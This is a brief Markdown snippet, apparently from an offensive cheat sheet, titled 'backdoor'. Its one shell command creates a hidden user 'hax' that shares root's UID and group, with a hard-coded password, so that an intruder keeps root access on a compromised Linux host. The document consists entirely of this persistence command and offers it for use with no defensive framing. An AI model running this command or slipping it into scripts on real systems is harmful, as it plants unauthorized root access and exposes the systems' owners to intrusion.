# backdoor
Add a backdoor user
```
useradd -ou 0 -g 0 hax -p $(openssl passwd -1 haxxor)
```
